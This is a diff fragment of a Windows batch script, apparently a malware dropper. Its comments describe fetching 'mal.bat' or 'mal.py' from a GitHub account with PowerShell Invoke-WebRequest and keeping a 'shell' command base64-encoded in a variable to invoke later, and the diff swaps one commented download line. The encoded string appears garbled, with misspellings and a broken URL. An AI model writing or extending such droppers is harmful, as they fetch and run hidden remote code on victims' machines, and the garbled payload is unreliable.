@@ -12,7 +12,7 @@ REM download the files from github
 REM just an example. powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bwebb3234/bwebb3234/main/mal.bat' -OutFile malzs1.bat
 
 REM I have the shell encoded in base64 and stored as a variable to be invoked later in the script
-REM think about it . powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bwebb3234/bwebb3234//main/mal.bat' -OutFile malzs1.ba
+REM think about it . powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bwebb3234/bwebb3234//main/mal.py' -OutFile malzs1.ba
 
 REM base64 web request encoded variable to use
 set encodedCommand="SW52b2xlLVdlc3RDaHJvd2UgLVVyaSAnaHR0cHM6Ly9naXRodWJ8L2J3ZWJiMzIzNC9id2VibjMyMzQvbWFsLmJhdCcgLU91dEZpbGUgbWFsemMxLmJhdA=="
